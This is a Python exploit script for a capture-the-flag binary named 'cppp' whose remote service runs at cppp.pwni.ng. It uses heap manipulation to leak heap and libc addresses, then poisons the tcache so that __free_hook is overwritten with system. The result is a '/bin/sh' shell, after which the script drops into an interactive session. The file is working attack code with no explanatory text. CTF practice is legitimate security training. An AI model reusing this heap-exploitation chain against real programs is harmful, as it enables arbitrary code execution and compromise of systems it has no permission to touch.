#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './cppp_58fc210859e4c5e43d051b6476cbc9f7'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'cppp.pwni.ng', 'port':4444})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    cp = CPPP(conn)

    for i in range(7):
        cp.add(str(i)*4, 'aaaa')
    cp.add('7777', 'b'*0x87)

    cp.remove(0)
    addr_heap_base = u(cp.view(6)) - 0x138f0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(6):
        cp.remove(0)

    addr_libc_mainarena = u(cp.view(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system    = libc.sep_function['system']
    addr_libc_free_hook = libc.symbols['__free_hook']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    cp.add('XXXX', 'x'*0x27)
    cp.remove(0)
    cp.remove(0)
    cp.add('YYYY', p64(addr_libc_free_hook-8).ljust(0x27, 'y'))
    cp.add('ZZZZ', ('/bin/sh\x00'+p64(addr_libc_system)).ljust(0x27, 'z'))
    
class CPPP:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, name, buf):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('name: ', name)
        self.sendlineafter('buf: ', buf)

    def remove(self, idx):
        self.sendlineafter('Choice: ', '2')
        self.sendlineafter('idx: ', str(idx))

    def view(self, idx):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('idx: ', str(idx))
        return self.recvuntil('\nDone!', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
